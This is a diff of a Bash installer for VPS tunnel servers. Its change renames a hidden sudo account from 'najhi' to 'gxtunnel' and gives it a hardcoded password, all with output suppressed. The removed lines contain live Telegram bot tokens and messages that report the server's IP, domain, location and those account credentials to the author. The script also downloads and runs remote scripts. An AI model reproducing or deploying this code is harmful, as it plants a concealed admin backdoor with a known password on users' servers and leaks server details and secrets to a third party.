@@ -102,53 +102,13 @@ domain=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 WKT=$(curl -s ipinfo.io/timezone )
 userdel jame > /dev/null 2>&1
-Username="najhi"
-Password=najhi
+Username="gxtunnel"
+Password=gxtunnel123
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="6582195916"
-CHATIDC=$(cat /etc/ilyass/telegram/id)
-KEY=$(cat /etc/ilyass/telegram/key)
-TOKEN="6621929387:AAG-7u9w7NTV2M0REX2oISWHdtgMdNZUQRc"
-TOKENC="7319578668:AAHmF39qi8cCXwmZqcYn0pGkMz1FZDUER84"
-TIME="10"
-URL="https://api.telegram.org/bot$TOKEN/sendMessage"
-URLC="https://api.telegram.org/bot$TOKENC/sendMessage"
 TEXT="Installation VIP Auto Script
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<code>VPS Name   :</code> <code>$Name</code>
-<code>Username   :</code> <code>najhi</code>
-<code>Password   :</code> <code>najhi</code>
-<code>Domain     :</code> <code>$domain</code>
-<code>VPS IP     :</code> <code>$MYIP</code>
-<code>VPS ISP    :</code> <code>$ISP</code>
-<code>Timezone   :</code> <code>$WKT</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Exp Sc.    :</code> <code>$Exp</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-By Admin 𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<i>Notifications Automatic From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪","url":"https://t.me/IlyassExE"}]]}' 
-
-TEXTC="Installation VIP Auto Script
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<code>VPS Name   :</code> <code>$Name</code>
-<code>Domain     :</code> <code>$domain</code>
-<code>VPS IP     :</code> <code>$MYIP</code>
-<code>VPS ISP    :</code> <code>$ISP</code>
-<code>Timezone   :</code> <code>$WKT</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Ilyass Key :</code> <code>$KEY</code>
-<code>Exp Sc.    :</code> <code>Unlimited (Key)</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-By Admin 𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<i>Notifications Automatic From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪","url":"https://t.me/IlyassExE"}]]}' 
-
 
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 curl -s --max-time $TIME -d "chat_id=$CHATIDC&disable_web_page_preview=1&text=$TEXTC&parse_mode=html" $URLC >/dev/null
@@ -309,5 +269,3 @@ sleep 2
 wget -q https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 sudo timedatectl set-timezone GMT
-mkdir /etc/ilyass/telegram
-wget -O /etc/ilyass/telegram/key.sh https://ws-najhi.ilyass.xyz:89/key.sh; bash /etc/ilyass/telegram/key.sh
